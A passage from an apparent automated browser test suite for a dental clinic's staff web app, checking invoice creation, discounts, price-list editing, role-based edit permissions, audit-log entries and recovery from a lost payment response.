  for (const re of [/Name: Kinza Rauf/, /MR#: 9825/, new RegExp(`Invoice#: ${invoiceNo}`), /Date: \d\d\/\d\d\/\d{4} - \d\d:\d\d [AP]M/, /RCT - Upper right molar\s+18,000\s+1\s+18,000/,
    /Grand Total\s+Rs\. 18,000/, /Paid Amount\s+Rs\. 5,000/, /Due Amount\s+Rs\. 13,000/, /Payment Mode: Card/]) assert.match(paper, re);
  assert.match(await bill.locator('.alert-info').innerText(), new RegExp(`Invoice ${invoiceNo} saved\\. Payment of Rs 5,000 saved\\.`));
  await shot(pbill, '41-bill-printed');
  // The receipt for the money taken is offered too; closing it comes back to the list.
  await bill.getByRole('button', { name: 'Print receipt' }).click();
  const receipt = pbill.locator('.modal', { has: pbill.locator('h2', { hasText: 'Payment receipt' }) });
  await receipt.waitFor();
  assert.match(await receipt.innerText(), /Received\s+Rs 5,000/);
  await receipt.locator('.modal-actions').getByRole('button', { name: 'Close' }).click();
  await pbill.waitForSelector('.modal', { state: 'detached' });
  await pbill.waitForFunction(() => document.activeElement?.closest('tr')?.textContent.includes('Kinza Rauf'));
  await row.locator('span.chip:text-is("Done")').waitFor();
  assert.match(await row.locator('td.pp').innerText(), /^13k/, 'the row\'s P.P is what stays due');
  // The patient's page: the invoice with what is unpaid on it, and the payment.
  await pbill.goto(BASE + '#/staff/patients?q=9825');
  await pbill.locator('table.list tbody tr', { hasText: 'Kinza Rauf' }).locator('a').first().click();
  await pbill.waitForSelector('h1:has-text("Kinza Rauf")');
  const money = pbill.locator('section.panel', { has: pbill.locator('h2', { hasText: 'Money' }) });
  const line = money.locator('table.list').first().locator('tbody tr', { hasText: invoiceNo });
  await line.waitFor();
  assert.match(await line.innerText(), /Rs 13,000 unpaid[\s\S]*Rs 18,000/);
  const { invoices, payments } = await billingOf(pbill, '9825');
  const saved = invoices.find((i) => i.invoice_no === invoiceNo);
  assert.equal(saved.visit_id && saved.branch_id, 2, 'for the visit on the list, at North Nazimabad');
  assert.deepEqual(payments.filter((p) => p.invoice_id === saved.id).map((p) => [p.amount, p.method]), [[5000, 'card']], 'one card payment of Rs 5,000 on that invoice');
});
await step('Bill: Save pressed twice quickly makes one invoice and one payment; the bill opens without printing (no payment: "Not paid yet", all of it due)', async () => {
  await pbill.goto(BASE + '#/staff/sheet');
  const before = await billingOf(pbill, '9811');
  const row = pbill.locator('table.sheet tbody tr', { hasText: 'Areeba Siddiqui' });
  await row.getByRole('button', { name: 'Bill Areeba Siddiqui' }).click();
  const m = pbill.locator('.modal', { has: pbill.locator('h2', { hasText: 'New invoice · Areeba Siddiqui' }) });
  await m.getByLabel('Treatment, line 1').fill('Checkup');
  await m.getByLabel('Payment (Rs)').fill('1500');
  await m.getByRole('button', { name: 'Save', exact: true }).dblclick();
  const bill = pbill.locator('.modal', { has: pbill.locator('h2', { hasText: /^Invoice INV-/ }) });
  await bill.waitFor();
  await pbill.waitForTimeout(300);
  // (the second click lands where the bill's buttons are now: it is let go, so no receipt opens and the bill stays)
  assert.deepEqual(await pbill.locator('.modal h2').allInnerTexts(), [await bill.locator('h2').innerText()], 'only the bill is open');
  const after = await billingOf(pbill, '9811');
  assert.equal(after.invoices.length, before.invoices.length + 1, 'one invoice');
  assert.equal(after.payments.length, before.payments.length + 1, 'one payment');
  assert.equal(await pbill.evaluate(() => window.__printed.length), 1, 'Save does not print (the one print is the first step\'s)');
  await bill.locator('.modal-actions').getByRole('button', { name: 'Close' }).click();
  // Nothing paid now: the bill says so, and the whole total is due.
  await row.getByRole('button', { name: 'Bill Areeba Siddiqui' }).click();
  const m2 = pbill.locator('.modal', { has: pbill.locator('h2', { hasText: 'New invoice · Areeba Siddiqui' }) });
  await m2.getByLabel('Treatment, line 1').fill('Scaling');
  await m2.getByLabel('Payment (Rs)').fill('0');
  assert.equal((await m2.locator('.bill-due').innerText()).trim(), 'Due Rs 4,000');
  await m2.getByRole('button', { name: 'Save', exact: true }).click();
  const bill2 = pbill.locator('.modal', { has: pbill.locator('h2', { hasText: /^Invoice INV-/ }) });
  await bill2.waitFor();
  const text = await bill2.locator('.bill-sheet').innerText();
  assert.match(text, /Payment Mode: Not paid yet/);
  assert.match(text, /Paid Amount\s+Rs\. 0/);
  assert.match(text, /Due Amount\s+Rs\. 4,000/);
  assert.equal(await bill2.getByRole('button', { name: 'Print receipt' }).count(), 0, 'no receipt without a payment');
  await bill2.locator('.modal-actions').getByRole('button', { name: 'Close' }).click();
  await pbill.waitForSelector('.modal', { state: 'detached' });
});
await step('Create ▾ (front desk): Invoice finds the patient by name, then the invoice form for them at the front desk\'s branch, for their visit on today\'s list; Patient opens the new-patient registration', async () => {
  await pbill.locator('.create-btn').click();
  assert.deepEqual(await pbill.locator('#create-menu-list button').allInnerTexts(), ['Patient', 'Invoice', 'Health record'], 'front desk: patients.create, billing.create and patients.edit');
  await pbill.locator('#create-menu-list button', { hasText: 'Invoice' }).click();
  const pick = pbill.locator('.modal', { has: pbill.locator('h2', { hasText: /^New invoice$/ }) });
  await pick.getByLabel('Search patients by name, Mr# or phone').fill('Hamza');
  await pick.locator('[role=option]', { hasText: 'Hamza Qureshi' }).click();
  const m = pbill.locator('.modal', { has: pbill.locator('h2', { hasText: 'New invoice · Hamza Qureshi' }) });
  await m.waitFor();
  assert.equal(await pick.count(), 0, 'the search dialog has closed');
  assert.equal(await m.getByLabel('Branch').evaluate((s) => s.selectedOptions[0].textContent), 'North Nazimabad');
  // For their visit on today's list: every line starts with that visit's doctor as "Performed by" (a patient on no list gets "Doctor not set").
  const visitDoctor = await pbill.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const v = (await state.data.listVisits({ date: localISO(), branchId: 2 })).find((x) => x.patient.full_name === 'Hamza Qureshi');
    const doc = (v?.staff || []).find((x) => x.role === 'doctor');
    return state.ref.clinicians.find((c) => c.id === doc?.clinician_id)?.display_name || null;
  });
  assert.ok(visitDoctor, 'Hamza Qureshi\'s visit today has a doctor');
  assert.equal(await m.getByLabel('Performed by, line 1').evaluate((sel) => sel.selectedOptions[0].textContent), visitDoctor, 'for their visit on today\'s list: "Performed by" is the visit\'s doctor');
  await m.getByRole('button', { name: 'Cancel' }).click();
  await pbill.waitForSelector('.modal', { state: 'detached' });
  await pbill.locator('.create-btn').click();
  await pbill.locator('#create-menu-list button', { hasText: 'Patient' }).click();
  const reg = pbill.locator('.modal', { has: pbill.locator('h2', { hasText: 'New patient' }) });
  await reg.waitFor();
  await reg.getByRole('button', { name: 'Cancel' }).click();
  await pbill.waitForSelector('.modal', { state: 'detached' });
  // Not a menu page: "Arrange my menu" does not list it, and it is not in the menu bar's pages.
  assert.equal(await pbill.locator('.topnav .create-menu').count(), 0);
});
await pbill.close();
await step('Create ▾ per role: the assistant gets Health record only (and writes today\'s treatment details with it; the medical history is read-only for them), the accountant Invoice only, Dr. Ali all three', async () => {
  const pr = await newPage();
  const items = async () => { await pr.locator('.create-btn').click(); const t = await pr.locator('#create-menu-list button').allInnerTexts(); await pr.keyboard.press('Escape'); return t; };
  await loginAs(pr, 'Assistant');
  assert.deepEqual(await items(), ['Health record']);
  await pr.locator('.create-btn').click();
  await pr.locator('#create-menu-list button', { hasText: 'Health record' }).click();
  const pick = pr.locator('.modal', { has: pr.locator('h2', { hasText: /^Health record$/ }) });
  await pick.getByLabel('Search patients by name, Mr# or phone').fill('Kinza');
  await pick.locator('[role=option]', { hasText: 'Kinza Rauf' }).click();
  const hr = pr.locator('.modal', { has: pr.locator('h2', { hasText: 'Health record · Kinza Rauf' }) });
  await hr.waitFor();
  assert.ok(await hr.getByLabel('Allergies').isDisabled(), 'medical history: patients.edit only');
  await hr.getByLabel('Treatment details').fill('U L 016 PC refresh');
  await hr.getByRole('button', { name: 'Save' }).click();
  await pr.waitForSelector('.toast:has-text("Health record saved for Kinza Rauf.")');
  const details = await pr.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listVisits({ date: localISO() })).filter((v) => v.patient.full_name === 'Kinza Rauf').map((v) => v.details_text);
  });
  assert.deepEqual(details, ['U L 016 PC refresh'], 'saved on today\'s visit, as the Treatment Details cell of the list');
  await tryAnotherRole(pr);
  await loginAs(pr, 'Accountant');
  assert.deepEqual(await items(), ['Invoice']);
  await tryAnotherRole(pr);
  await loginAs(pr, 'Dr. Ali Rashid');
  assert.deepEqual(await items(), ['Patient', 'Invoice', 'Health record']);
  await pr.close();
});
await step('Bill and Create on a phone: the Bill button is in sight beside the name without scrolling sideways, "Create" is a "+" in the top bar, and the page does not scroll sideways', async () => {
  const pp = await newPage({ width: 390, height: 844 });
  await loginAs(pp, 'Front desk \\(North Nazimabad\\)');
  await pp.goto(BASE + '#/staff/sheet');
  const bill = pp.getByRole('button', { name: 'Bill Kinza Rauf' });
  await bill.waitFor();
  const box = await bill.boundingBox();
  assert.ok(box && box.x >= 0 && box.x + box.width <= 390, `Bill inside the screen: ${JSON.stringify(box)}`);
  const plus = await pp.getByRole('button', { name: 'Create', exact: true }).boundingBox();
  assert.ok(plus && plus.x + plus.width <= 390 && plus.width >= 40, `"+" in the top bar: ${JSON.stringify(plus)}`);
  const search = await pp.locator('.topsearch').boundingBox();
  assert.ok(search.width >= 120, `the search box keeps its room: ${search.width}`);
  assert.ok(await pp.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth + 1), 'no sideways scrolling');
  await bill.click();
  await pp.locator('.modal h2', { hasText: 'New invoice · Kinza Rauf' }).waitFor();
  await shot(pp, '42-bill-form-phone');
  await pp.close();
});

// ------------------------------------------------------------- The invoice form like Healthwire's (a discount and "Performed by" per line), the price
// list, and editing invoices and payments (owner, 15 Oct 2026: "quantity, price, description, discount and the total given below"; "braces kit
// should be given separate amounts as they are different"; "admin and accounts should have edit button ... and also clinic coordinator").
const pdesk = await newPage();
const moneyOf = (pg) => pg.locator('section.panel', { has: pg.locator('h2', { hasText: 'Money' }) });
const openMoney = async (pg, mr, name) => {
  await pg.goto(BASE + `#/staff/patients?q=${mr}`);
  await pg.locator('table.list tbody tr', { hasText: name }).locator('a').first().click();
  await pg.waitForSelector(`h1:has-text("${name}")`);
  await moneyOf(pg).waitFor();
};
let deskInvoice = '';
await step('Price list: the invoice picker offers the sample braces kits first, each with its own price, and the Aaj ki List\'s treatment picker does not; two lines with a discount on one, a discount on the total and a doctor per line give the right totals, and the printed bill matches', async () => {
  await loginAs(pdesk, 'Front desk \\(North Nazimabad\\)');
  await stubPrint(pdesk);
  await pdesk.goto(BASE + '#/staff/sheet');
  await pdesk.waitForSelector('#sheet-treatments', { state: 'attached' });
  const visitTypes = await pdesk.locator('#sheet-treatments option').evaluateAll((os) => os.map((o) => o.value));
  assert.ok(visitTypes.includes('Monthly') && visitTypes.includes('Bonding'), 'the visit types are on the list\'s picker');
  assert.ok(!visitTypes.some((v) => /Braces Kit|Braces Monthly Payment|Retainers, pair/.test(v)), `no price-list item on the list's picker: ${visitTypes.join(', ')}`);
  const row = pdesk.locator('table.sheet tbody tr', { hasText: 'Kinza Rauf' });
  await row.getByRole('button', { name: 'Bill Kinza Rauf' }).click();
  const m = pdesk.locator('.modal', { has: pdesk.locator('h2', { hasText: 'New invoice · Kinza Rauf' }) });
  await m.waitFor();
  const offered = await m.getByLabel('Treatment, line 1').evaluate((input) => [...input.list.options].map((o) => [o.value, o.label]));
  assert.deepEqual(offered.slice(0, 3), [['Braces Kit (Metal, sample)', 'Rs 50,000'], ['Braces Kit (Ceramic, sample)', 'Rs 75,000'], ['Braces Kit (Self-ligating, sample)', 'Rs 100,000']],
    'the price list first, each kit with its own price');
  assert.ok(offered.some(([v]) => v === 'Monthly') && !offered.some(([v]) => v === 'Braces Checkup'), 'then visit types that have a price (none without one)');
  await m.getByLabel('Treatment, line 1').fill('Braces Kit (Ceramic, sample)');
  assert.equal(await m.getByLabel('Rate (Rs), line 1').inputValue(), '75000', 'the kit\'s own price fills the rate');
  await m.getByLabel('Discount, line 1').fill('500');
  await m.getByLabel('Performed by, line 1').selectOption({ label: 'Dr. Bushra (sample)' });
  await m.getByRole('button', { name: '+ Add item' }).click();
  await m.getByLabel('Treatment, line 2').fill('Braces Monthly Payment (sample)');
  assert.equal(await m.getByLabel('Rate (Rs), line 2').inputValue(), '5000');
  await m.getByLabel('Qty, line 2').fill('2');
  await m.getByLabel('Discount in Rs or %, line 2').selectOption('pct');
  await m.getByLabel('Discount, line 2').fill('3');
  assert.equal(await m.getByLabel('Amount, line 2').innerText(), 'Rs 10,000', 'the line\'s amount: rate x quantity');
  await m.getByLabel('Total discount', { exact: true }).fill('200');
  await m.getByLabel('Discount reason').fill('Sample offer');
  assert.equal((await m.locator('.bill-totals').innerText()).replace(/\s+/g, ' ').trim(), 'Sub-total Rs 85,000 Discount Rs 1,000 Grand total Rs 84,000',
    'sub-total 85,000; discount 500 on the kit + 300 (3% of the monthly payments) + 200 on the total (the demo front desk may give 5%, Rs 1,000); grand total 84,000');
  await m.getByLabel('Payment (Rs)').fill('50000');
  assert.equal((await m.locator('.bill-due').innerText()).trim(), 'Due Rs 34,000');
  await m.getByRole('button', { name: 'Save & Print' }).click();
  const bill = pdesk.locator('.modal', { has: pdesk.locator('h2', { hasText: /^Invoice INV-/ }) });
  await bill.waitFor();
  deskInvoice = (await bill.locator('h2').innerText()).replace('Invoice ', '');
  await pdesk.waitForFunction(() => window.__printed.length === 1);
  const paper = (await pdesk.evaluate(() => window.__printed))[0].sheets[0];
  for (const re of [/Braces Kit \(Ceramic, sample\)\s+75,000\s+1\s+75,000/, /Braces Monthly Payment \(sample\)\s+5,000\s+2\s+10,000/, /Sub-Total\s+Rs\. 85,000/,
    /Discount\s+- Rs\. 1,000/, /Grand Total\s+Rs\. 84,000/, /Paid Amount\s+Rs\. 50,000/, /Due Amount\s+Rs\. 34,000/, /Payment Mode: Cash/]) assert.match(paper, re);
  assert.doesNotMatch(paper, /Dr\. Bushra/, 'the bill does not show who did the treatment');
  await bill.locator('.modal-actions').getByRole('button', { name: 'Close' }).click();
  await pdesk.waitForSelector('.modal', { state: 'detached' });
  const { invoices } = await billingOf(pdesk, '9825');
  const saved = invoices.find((i) => i.invoice_no === deskInvoice);
  const bushra = await pdesk.evaluate(async () => (await import('/js/state.js')).state.ref.clinicians.find((c) => c.display_name === 'Dr. Bushra (sample)').id);
  assert.equal(saved.discount_amount, 1000, 'the invoice\'s discount is the whole discount');
  assert.equal(saved.status, 'issued', 'within the front desk\'s limit');
  assert.deepEqual(saved.items.map((it) => [it.description, it.discount_amount, it.clinician_id, !!it.treatment_id]),
    [['Braces Kit (Ceramic, sample)', 500, bushra, true], ['Braces Monthly Payment (sample)', 300, null, true]], 'each line keeps its discount, its doctor and its price-list item');
});
await step('Edit is for "Edit or void invoices": the front desk sees no Edit on the patient\'s invoices or payments (and takes a second payment, cash)', async () => {
  await openMoney(pdesk, '9825', 'Kinza Rauf');
  const money = moneyOf(pdesk);
  await money.locator('table.list').first().locator('tbody tr', { hasText: deskInvoice }).waitFor();
  await money.locator('details summary').click();
  assert.equal(await money.getByRole('button', { name: /^Edit (invoice|payment)/ }).count(), 0, 'no Edit for the front desk');
  await pdesk.getByRole('button', { name: 'Take payment' }).click();
  const take = pdesk.locator('.modal', { has: pdesk.locator('h2', { hasText: 'Take payment · Kinza Rauf' }) });
  const forThis = await take.getByLabel('For invoice').evaluate((sel, no) => [...sel.options].find((o) => o.textContent.startsWith(no)).value, deskInvoice);
  await take.getByLabel('For invoice').selectOption(forThis);
  await take.getByLabel('Amount (Rs)').fill('2000');
  await take.getByRole('button', { name: 'Save payment' }).click();
  await pdesk.waitForSelector('.toast:has-text("Payment of Rs 2,000 saved.")');
});
await step('The accountant edits a payment from Cash to Card and an invoice line (the quantity), from the patient\'s Money panel', async () => {
  await tryAnotherRole(pdesk);
  await loginAs(pdesk, 'Accountant');
  await openMoney(pdesk, '9825', 'Kinza Rauf');
  const money = moneyOf(pdesk);
  await money.locator('details summary').click();
  await money.getByRole('button', { name: /^Edit payment, .* Rs 50,000 cash$/ }).click();
  const e = pdesk.locator('.modal', { has: pdesk.locator('h2', { hasText: 'Edit payment · Rs 50,000 Cash' }) });
  await e.getByLabel('Method').selectOption('card');
  await e.getByRole('button', { name: 'Save changes' }).click();
  await pdesk.waitForSelector('.toast:has-text("Payment saved as Card.")');
  await money.locator('details summary').click();
  await money.getByRole('button', { name: /^Edit payment, .* Rs 50,000 card$/ }).waitFor();
  // The invoice: two monthly payments were one.
  await money.getByRole('button', { name: `Edit invoice ${deskInvoice}` }).click();
  const ei = pdesk.locator('.modal', { has: pdesk.locator('h2', { hasText: `Edit invoice ${deskInvoice}` }) });
  assert.equal(await ei.getByLabel('Treatment, line 1').inputValue(), 'Braces Kit (Ceramic, sample)', 'the lines as saved');
  assert.equal(await ei.getByLabel('Discount, line 1').inputValue(), '500');
  assert.equal(await ei.getByLabel('Performed by, line 1').evaluate((s) => s.selectedOptions[0].textContent), 'Dr. Bushra (sample)');
  assert.equal(await ei.getByLabel('Total discount', { exact: true }).inputValue(), '200', 'the discount on the total is what is left of the invoice\'s discount');
  await ei.getByLabel('Qty, line 2').fill('1');
  assert.equal((await ei.locator('.bill-totals').innerText()).replace(/\s+/g, ' ').trim(), 'Sub-total Rs 80,000 Discount Rs 1,000 Grand total Rs 79,000');
  await ei.getByRole('button', { name: 'Save changes' }).click();
  await pdesk.waitForSelector(`.toast:has-text("Invoice ${deskInvoice} saved.")`);
  assert.match(await money.locator('table.list').first().locator('tbody tr', { hasText: deskInvoice }).innerText(), /Rs 27,000 unpaid[\s\S]*Rs 79,000/, 'the new total, less the 52,000 paid');
});
await step('The clinic coordinator (billing.edit since 15 Oct) edits the other payment from Cash to Card and an invoice line (its description); the discounts are not theirs to change', async () => {
  await tryAnotherRole(pdesk);
  await loginAs(pdesk, 'Clinic coordinator');
  await openMoney(pdesk, '9825', 'Kinza Rauf');
  const money = moneyOf(pdesk);
  await money.locator('details summary').click();
  await money.getByRole('button', { name: /^Edit payment, .* Rs 2,000 cash$/ }).click();
  const e = pdesk.locator('.modal', { has: pdesk.locator('h2', { hasText: 'Edit payment · Rs 2,000 Cash' }) });
  await e.getByLabel('Method').selectOption('card');
  await e.getByLabel('Note').fill('Paid by card, entered as cash');
  await e.getByRole('button', { name: 'Save changes' }).click();
  await pdesk.waitForSelector('.toast:has-text("Payment saved as Card.")');
  await money.getByRole('button', { name: `Edit invoice ${deskInvoice}` }).click();
  const ei = pdesk.locator('.modal', { has: pdesk.locator('h2', { hasText: `Edit invoice ${deskInvoice}` }) });
  assert.ok(await ei.getByLabel('Discount, line 1').isDisabled() && await ei.getByLabel('Total discount', { exact: true }).isDisabled(), 'no "Give discounts": the discounts stay as they are');
  await ei.getByLabel('Description, line 1').fill('Upper and lower');
  await ei.getByRole('button', { name: 'Save changes' }).click();
  await pdesk.waitForSelector(`.toast:has-text("Invoice ${deskInvoice} saved.")`);
  const { invoices, payments } = await billingOf(pdesk, '9825');
  const inv = invoices.find((i) => i.invoice_no === deskInvoice);
  assert.equal(inv.status, 'issued', 'the same discount on the same sub-total needs no approval');
  assert.deepEqual(inv.items.map((it) => [it.description, it.quantity, it.discount_amount]),
    [['Braces Kit (Ceramic, sample) - Upper and lower', 1, 500], ['Braces Monthly Payment (sample)', 1, 300]]);
  assert.deepEqual(payments.filter((p) => p.invoice_id === inv.id).map((p) => [p.amount, p.method]).sort((a, b) => a[0] - b[0]), [[2000, 'card'], [50000, 'card']], 'both payments are card now');
});
await step('The assistant sees no Edit; Dr. Ali\'s Audit log shows both payment changes (cash -> card, and who) and the invoice changes', async () => {
  await tryAnotherRole(pdesk);
  await loginAs(pdesk, 'Assistant');
  await openMoney(pdesk, '9825', 'Kinza Rauf');
  // The money lock (20261015000400_finance_privacy.sql): the assistant sees the patient's dues only, not the invoices and payments.
  await moneyOf(pdesk).getByText('Invoices and payments are with accounts.').waitFor();
  assert.equal(await moneyOf(pdesk).getByRole('button', { name: /^(Edit (invoice|payment)|Receipt, )/ }).count(), 0, 'no invoices, payments or Edit for the assistant');
  await tryAnotherRole(pdesk);
  await loginAs(pdesk, 'Dr. Ali Rashid');
  await pdesk.goto(BASE + '#/staff/admin?tab=audit');
  await pdesk.waitForSelector('h2:has-text("Recent changes")');
  const rows = await pdesk.locator('table.list tbody tr').evaluateAll((trs) => trs.map((tr) => tr.innerText.replace(/\s+/g, ' ')));
  assert.ok(rows.some((r) => /Accountant \(sample\) payments update method: cash → card/.test(r)), `the accountant's change: ${rows.slice(0, 8).join(' | ')}`);
  assert.ok(rows.some((r) => /Clinic coordinator \(sample\) payments update method: cash → card; notes: \(empty\) → Paid by card, entered as cash/.test(r)), 'the coordinator\'s change');
  assert.ok(rows.some((r) => /Clinic coordinator \(sample\) invoice items insert/.test(r)) && rows.some((r) => /Accountant \(sample\) invoices update subtotal: 85000 → 80000/.test(r)), 'the invoice edits');
  // Dr. Ali edits too (admin has every permission).
  await openMoney(pdesk, '9825', 'Kinza Rauf');
  assert.ok(await moneyOf(pdesk).getByRole('button', { name: `Edit invoice ${deskInvoice}` }).count(), 'Edit for Dr. Ali');
});
await step('Clinic setup: Dr. Ali adds a price-list item, re-prices and renames one and switches one off; a name that is already a visit type is refused; the invoice form offers the list as it is now', async () => {
  await pdesk.goto(BASE + '#/staff/admin?tab=setup');
  await pdesk.waitForSelector('h2:text("Price list")');
  const panel = pdesk.locator('section.panel', { has: pdesk.locator('h2', { hasText: /^Price list$/ }) });
  assert.match(await panel.innerText(), /Braces Kit \(Metal, sample\)\s+Rs 50,000/);
  await panel.getByRole('button', { name: 'New price-list item' }).click();
  let m = pdesk.locator('.modal');
  await m.getByLabel('Name').fill('Monthly');
  await m.getByLabel('Price (Rs)').fill('4000');
  await m.getByRole('button', { name: 'Save' }).click();
  await m.getByText('"Monthly" is already a visit type of the Aaj ki List.').waitFor();
  await m.getByLabel('Name').fill('Braces Kit (Lingual, sample)');
  await m.getByLabel('Price (Rs)').fill('150000');
  await m.getByRole('button', { name: 'Save' }).click();
  await pdesk.waitForSelector('.toast:has-text("Saved")');
  await panel.locator('td', { hasText: 'Braces Kit (Lingual, sample)' }).waitFor();
  await panel.getByRole('button', { name: 'Edit Braces Kit (Metal, sample)' }).click();
  m = pdesk.locator('.modal');
  await m.getByLabel('Name').fill('Braces Kit (Steel, sample)');
  await m.getByLabel('Price (Rs)').fill('60000');
  await m.getByRole('button', { name: 'Save' }).click();
  await pdesk.waitForSelector('.toast:has-text("Saved")');
  await panel.getByRole('button', { name: 'Edit Retainers, pair (sample)' }).click();
  m = pdesk.locator('.modal');
  await m.getByLabel('On the invoice form').uncheck();
  await m.getByRole('button', { name: 'Save' }).click();
  await pdesk.waitForSelector('.toast:has-text("Saved")');
  const text = await panel.innerText();
  assert.match(text, /Braces Kit \(Steel, sample\)\s+Rs 60,000/);
  assert.match(text, /Retainers, pair \(sample\)[\s\S]*Switched off/);
  assert.ok(!(await pdesk.locator('section.panel', { has: pdesk.locator('h2', { hasText: /^Treatments$/ }) }).innerText()).includes('Braces Kit'), 'the Treatments table holds the visit types only');
  // The invoice form, from Create ▾ for a patient on no list today.
  await pdesk.locator('.create-btn').click();
  await pdesk.locator('#create-menu-list button', { hasText: 'Invoice' }).click();
  const pick = pdesk.locator('.modal', { has: pdesk.locator('h2', { hasText: /^New invoice$/ }) });
  await pick.getByLabel('Search patients by name, Mr# or phone').fill('Kinza');
  await pick.locator('[role=option]', { hasText: 'Kinza Rauf' }).click();
  const f = pdesk.locator('.modal', { has: pdesk.locator('h2', { hasText: 'New invoice · Kinza Rauf' }) });
  const offered = await f.getByLabel('Treatment, line 1').evaluate((input) => [...input.list.options].map((o) => `${o.value} ${o.label}`));
  assert.ok(offered.includes('Braces Kit (Steel, sample) Rs 60,000') && offered.includes('Braces Kit (Lingual, sample) Rs 150,000'), offered.slice(0, 7).join(' | '));
  assert.ok(!offered.some((o) => /Metal|Retainers, pair/.test(o)), 'the old name and the switched-off item are gone');
  await f.getByLabel('Treatment, line 1').fill('Braces Kit (Steel, sample)');
  assert.equal(await f.getByLabel('Rate (Rs), line 1').inputValue(), '60000', 'the new price');
  await f.getByRole('button', { name: 'Cancel' }).click();
  await pdesk.waitForSelector('.modal', { state: 'detached' });
});
await pdesk.close();

// ------------------------------------------------------------- The billing desk with the access list as the clinic has it live (15 Oct 2026: the front
// desk bills with "Create invoices and take payments" alone, without "View invoices and payments" or "Give discounts"; the coordinator edits without
// "View invoices and payments"), and what the review of it found: a rate that came from the price list, a six-digit rate, the payment in sight, a
// payment whose answer was lost, a discount rejected then edited, an imported line edited, a refund and a closed cash day, an advance, and a
// checkup patient registered then billed.
const plive = await newPage({ width: 1366, height: 768 });
const asLive = (pg) => pg.evaluate(async () => {
  const { state } = await import('/js/state.js');
  for (const [role, key] of [['front_desk', 'billing.view'], ['front_desk', 'discount.give'], ['coordinator', 'billing.view']]) await state.data.setRolePermission(role, key, false);
});
const patientId = (pg, mr) => pg.evaluate(async (mr) => (await (await import('/js/state.js')).state.data.searchPatients(mr)).find((x) => x.mr_number === mr).id, mr);
await step('Live access list, front desk: Bill on the list; a rate from the price list goes when the treatment is not on the list; a six-digit rate is whole; the payment and what is due are in sight at 1366 x 768', async () => {
  await loginAs(plive, 'Dr. Ali Rashid');
  await asLive(plive);
  await tryAnotherRole(plive);
  await loginAs(plive, 'Front desk \\(North Nazimabad\\)');
  assert.ok(await plive.evaluate(async () => { const { can } = await import('/js/state.js'); return can('billing.create') && !can('billing.view') && !can('discount.give'); }), 'the front desk as live');
  await stubPrint(plive);
  await plive.goto(BASE + '#/staff/sheet');
  await plive.locator('table.sheet tbody tr', { hasText: 'Kinza Rauf' }).getByRole('button', { name: 'Bill Kinza Rauf' }).click();
  const m = plive.locator('.modal', { has: plive.locator('h2', { hasText: 'New invoice · Kinza Rauf' }) });
  await m.waitFor();
  assert.ok(await m.getByLabel('Discount, line 1').isDisabled() && await m.getByLabel('Total discount', { exact: true }).count() === 0, 'no "Give discounts": no discount to type');
  assert.equal(await m.getByLabel('Treatment, line 1').inputValue(), 'Crown Insertion', 'the row\'s treatment');
  assert.equal(await m.getByLabel('Rate (Rs), line 1').inputValue(), '20000');
  await m.getByLabel('Treatment, line 1').fill('Whitening (special)');
  assert.equal(await m.getByLabel('Rate (Rs), line 1').inputValue(), '', 'a treatment not on the list: its rate is asked for, the crown\'s is not kept');
  assert.equal(await m.getByLabel('Payment (Rs)').inputValue(), '0', 'and the payment follows the total');
  await m.getByRole('button', { name: 'Save', exact: true }).click();
  await m.locator('.field-error', { hasText: 'Enter a rate for this treatment.' }).waitFor();
  await m.getByLabel('Treatment, line 1').fill('Braces Kit (Self-ligating, sample)');
  const rate = m.getByLabel('Rate (Rs), line 1');
  assert.equal(await rate.inputValue(), '100000');
  await rate.fill('120000');
  await rate.focus();
  assert.ok(await rate.evaluate((el) => el.scrollWidth <= el.clientWidth), `Rs 120,000 is whole in the Rate box: ${await rate.evaluate((el) => `${el.scrollWidth} > ${el.clientWidth}`)}`);
  const sight = await m.evaluate((modal) => {
    const body = modal.querySelector('.modal-body').getBoundingClientRect();
    const due = modal.querySelector('.bill-due').getBoundingClientRect();
    const pay = modal.querySelector('.bill-pay input').getBoundingClientRect();
    return { body: Math.round(body.bottom), due: Math.round(due.bottom), pay: Math.round(pay.bottom) };
  });
  assert.ok(sight.due <= sight.body && sight.pay <= sight.body, `the payment and Due in sight without scrolling: ${JSON.stringify(sight)}`);
  await m.getByRole('button', { name: 'Cancel' }).click();
  await m.waitFor({ state: 'detached' });
});
await step('A slow line: the payment\'s answer is lost; Save again finds it (no second payment) and the bill says Card, the receipt Card and the branch; the front desk (no "View invoices and payments") sees the invoice on the patient\'s page', async () => {
  await plive.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__real = { recordPayment: d.recordPayment, patientBilling: d.patientBilling };
    let lose = true;
    d.recordPayment = async (p) => { const saved = await window.__real.recordPayment.call(d, p); if (lose) { lose = false; throw new TypeError('Failed to fetch'); } return saved; };
    // as the live data layer: a few columns of each invoice and payment
    d.patientBilling = async (id) => {
      const b = await window.__real.patientBilling.call(d, id);
      return { invoices: b.invoices.map(({ id: i, invoice_no, issue_date, subtotal, discount_amount, total, status }) => ({ id: i, invoice_no, issue_date, subtotal, discount_amount, total, status })),
        payments: b.payments.map(({ id: i, invoice_id, amount, received_at }) => ({ id: i, invoice_id, amount, received_at })) };
    };
  });
  const before = (await billingOf(plive, '9825')).payments.length;
  await plive.locator('table.sheet tbody tr', { hasText: 'Kinza Rauf' }).getByRole('button', { name: 'Bill Kinza Rauf' }).click();
  const m = plive.locator('.modal', { has: plive.locator('h2', { hasText: 'New invoice · Kinza Rauf' }) });
  await m.getByLabel('Treatment, line 1').fill('Braces Kit (Ceramic, sample)');
  await m.getByLabel('Payment method').selectOption('card');
  await m.getByLabel('Payment (Rs)').fill('30000');
  await m.getByRole('button', { name: 'Save & Print' }).click();
  await plive.locator('.toast', { hasText: 'may or may not have been saved' }).locator('.toast-close').click(); // (it lies over the dialog's buttons)
  await m.getByRole('button', { name: 'Save & Print' }).click();
  const bill = plive.locator('.modal', { has: plive.locator('h2', { hasText: /^Invoice INV-/ }) });
  await bill.waitFor();
  await plive.waitForFunction(() => window.__printed.length === 1);
  const paper = (await plive.evaluate(() => window.__printed))[0].sheets[0];
  for (const re of [/Payment Mode: Card/, /Paid Amount\s+Rs\. 30,000/, /Due Amount\s+Rs\. 45,000/]) assert.match(paper, re);
  await bill.getByRole('button', { name: 'Print receipt' }).click();
  const receipt = plive.locator('.modal', { has: plive.locator('h2', { hasText: 'Payment receipt' }) });
